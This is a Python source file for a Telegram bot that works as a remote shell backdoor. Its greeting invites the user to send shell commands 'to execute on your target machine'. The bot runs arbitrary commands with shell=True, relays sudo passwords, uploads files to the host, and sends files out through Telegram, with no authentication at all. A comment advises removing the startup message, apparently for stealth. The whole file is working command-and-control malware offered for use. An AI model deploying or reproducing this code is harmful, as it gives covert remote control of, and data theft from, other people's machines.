import subprocess
import os
import threading
import telepot
from telepot.loop import MessageLoop

TOKEN = 'BOT_TOKEN_HERE'

user_last_directory = {}
pending_sudo_commands = {}
user_live_mode = {}

info_msg = (
    "Send me sHEll commands to execute on your target machine.\n"
    "More - /help"
)

def stream_output(process, chat_id, bot):
    for line in iter(process.stdout.readline, ''):
        if line.strip():
            bot.sendMessage(chat_id, line.strip())

def execute_command(msg):
    chat_id = msg['chat']['id']
    command = msg['text']
    cwd = user_last_directory.get(chat_id, os.getcwd())
    live_mode = user_live_mode.get(chat_id, False)
    
    if command.startswith('sudo '):
        pending_sudo_commands[chat_id] = command
        bot.sendMessage(chat_id, 'Please enter sudo password:')
        return
    
    try:
        if command.startswith('cd '):
            new_dir = subprocess.check_output(f'cd {cwd} && {command} && pwd', shell=True, text=True).strip()
            user_last_directory[chat_id] = new_dir
            bot.sendMessage(chat_id, f'Current directory :> {new_dir}')
            return

        process = subprocess.Popen(f'cd {cwd} && {command}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if live_mode:
            threading.Thread(target=stream_output, args=(process, chat_id, bot)).start()
        else:
            result, error = process.communicate()
            if process.returncode == 0:
                bot.sendMessage(chat_id, result or 'Command executed successfully.')
            else:
                bot.sendMessage(chat_id, f'Error: {error}')
    
    except Exception as ex:
        bot.sendMessage(chat_id, f'Error: {ex}')

def sudo_password(msg):
    chat_id = msg['chat']['id']
    password = msg['text']
    command = pending_sudo_commands.pop(chat_id, None)
    cwd = user_last_directory.get(chat_id, os.getcwd())
    live_mode = user_live_mode.get(chat_id, False)
    
    if command:
        try:
            process = subprocess.Popen(f'echo {password} | sudo -S {command[5:]}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=cwd)
            
            if live_mode:
                threading.Thread(target=stream_output, args=(process, chat_id, bot)).start()
            else:
                result, error = process.communicate()
                if process.returncode == 0:
                    bot.sendMessage(chat_id, result or 'Sudo command executed successfully.')
                else:
                    bot.sendMessage(chat_id, f'Error: {error}')
        except Exception as ex:
            bot.sendMessage(chat_id, f'Error: {ex}')
    else:
        bot.sendMessage(chat_id, 'No pending sudo command found.')

def live(msg):
    chat_id = msg['chat']['id']
    user_live_mode[chat_id] = True
    bot.sendMessage(chat_id, 'Live terminal mode activated.')

def normal(msg):
    chat_id = msg['chat']['id']
    user_live_mode[chat_id] = False
    bot.sendMessage(chat_id, 'Live terminal mode deactivated.')

def start(msg):
    chat_id = msg['chat']['id']
    bot.sendMessage(chat_id, info_msg)

def help_command(msg):
    chat_id = msg['chat']['id']
    help_message = (
        "Usage:\n\n"
        "/start - Start the bot\n\n"
        "/help - Show this help message\n\n"
        "/live - Activate live terminal mode\n\n"
        "/normal - Deactivate live terminal mode\n\n"
        "/get <filename> - Download a file from the current directory\n\n"
        "Send/Drop files to upload them to the current directory\n"
    )
    bot.sendMessage(chat_id, help_message)

def get_file(msg):
    chat_id = msg['chat']['id']
    text = msg['text']
    cwd = user_last_directory.get(chat_id, os.getcwd())
    
    if len(text.split()) < 2:
        bot.sendMessage(chat_id, 'Usage: /get <filename>')
        return
    
    filename = text.split(' ')[1]
    file_path = os.path.join(cwd, filename)
    
    if os.path.exists(file_path):
        bot.sendDocument(chat_id, open(file_path, 'rb'))
        bot.sendMessage(chat_id, f'File "{filename}" dumped.')
    else:
        bot.sendMessage(chat_id, f'Error: File "{filename}" not found.')

def handle_document(msg):
    chat_id = msg['chat']['id']
    cwd = user_last_directory.get(chat_id, os.getcwd())
    file_id = msg['document']['file_id']
    file_info = bot.getFile(file_id)
    file_path = file_info['file_path']
    file_name = file_path.split('/')[-1]
    
    bot.download_file(file_id, os.path.join(cwd, file_name))
    bot.sendMessage(chat_id, f'File "{file_name}" saved in {cwd}.')

def handle_message(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    
    if content_type == 'text':
        text = msg['text']
        if text.startswith('/start'):
            start(msg)
        elif text.startswith('/help'):
            help_command(msg)
        elif text.startswith('/live'):
            live(msg)
        elif text.startswith('/normal'):
            normal(msg)
        elif text.startswith('/get'):
            get_file(msg)
        else:
            execute_command(msg)
    elif content_type == 'document':
        handle_document(msg)

bot = telepot.Bot(TOKEN)
MessageLoop(bot, handle_message).run_as_thread()

print("Running... Check Telegram!") #remove this line just in case

import time
while True:
    time.sleep(10)
